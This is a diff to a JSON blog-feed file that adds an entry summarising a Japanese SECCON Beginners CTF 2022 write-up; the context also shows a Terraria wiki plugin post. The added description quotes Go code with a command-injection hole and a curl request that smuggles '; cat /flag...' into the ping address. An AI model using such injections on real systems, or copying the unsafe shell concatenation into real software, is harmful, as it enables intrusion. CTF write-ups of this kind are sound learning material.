@@ -3609,6 +3609,21 @@
       "siteUrl": "https://naari.hatenablog.com/",
       "articles": [
         {
+          "id": "hatenablog://entry/13574176438099321773",
+          "author": null,
+          "description": "あ\n数年ぶりにCTFをやりたい気持ちになって、身内のSlackで「なんかやりたい」って言ったらいつの間にか参加が確定していた。\n突然投げられたチーム登録用パスワード\nWeb\nUtil\npingを投げる対象にコマンドインジェクションできる部分があった。\n   r.POST(\"/util/ping\", func(c *gin.Context) {\n        var param IP\n        if err := c.Bind(&param); err != nil {\n            c.JSON(400, gin.H{\"message\": \"Invalid parameter\"})\n            return\n        }\n\n        commnd := \"ping -c 1 -W 1 \" + param.Address + \" 1>&2\"\n        result, _ := exec.Command(\"sh\", \"-c\", commnd).CombinedOutput()\n\n        c.JSON(200, gin.H{\n            \"result\": string(result),\n        })\n    })\n\n\n\nただ、これを受け取るフロントではIPアドレスらしき値以外はすべて弾く処理が入っていたので、curlあたりで雑にリクエストを投げ、終了。\n$ curl 'https://util.quals.beginners.seccon.jp/util/ping' -H 'Content-Type: application/json' --data-raw '{\"address\":\"127.0.0.1; cat /flag_A74FIBkN9sELAjOc.txt\"}'\n// => {\"result\"…",
+          "link": "https://naari.hatenablog.com/entry/2022/06/05/224238",
+          "publishedOn": "2022-06-05T13:42:38.000Z",
+          "wordCount": 763,
+          "title": "SECCON Beginners CTF 2022 Write-up",
+          "enclosure": {
+            "url": "https://cdn-ak.f.st-hatena.com/images/fotolife/n/naari_3/20220605/20220605223836.png",
+            "type": "image/png",
+            "length": "0"
+          },
+          "imageUrl": "https://cdn-ak.f.st-hatena.com/images/fotolife/n/naari_3/20220605/20220605223836.png"
+        },
+        {
           "id": "hatenablog://entry/13574176438096940203",
           "author": null,
           "description": "身内でTerrariaが流行っている。このゲームは知っておかなければならないことが無限に存在し、特にハードモード以降はTerraria Japan Wikiに頼り切りにならなければやっていくことができない。で、PowerToys Runでプラグインを作ることができればかなり丁度良いのではないか？となって、調べたらどうやらいけそうだったので作った。PowerToys Runでプラグインを作るための記事はこちらでどうぞ。\nこんな感じのプラグインになった。Terraria Japan Wikiの検索結果をそのまま表示した上で、項目を選択するとデフォルトのブラウザでページが開くようになる。\n\nGitHub Releasesにて配布中。Terrariaプレイヤーはぜひとも使ってみてください。\nGitHub - naari3/terraria-japan-wiki-PowerToysRun: PowerToys Run Plugin for Terraria Japan Wiki Search\nPowerToys Runのプラグインを自作する - 名有りさんの日記\nプラグイン制作についての記事は↑で書いた。\n自分で作ったものを褒めるのもなんだけれど、まじで便利。ほんとうに便利で、これがないとTerrariaをやりたくないというくらいにはなっている。なくてはならないプラグインとなってしまった。\nPowerToys Runのプラグイン制作はマジで可能性を感じるので、何か必要に応じて作っていきたいね。",
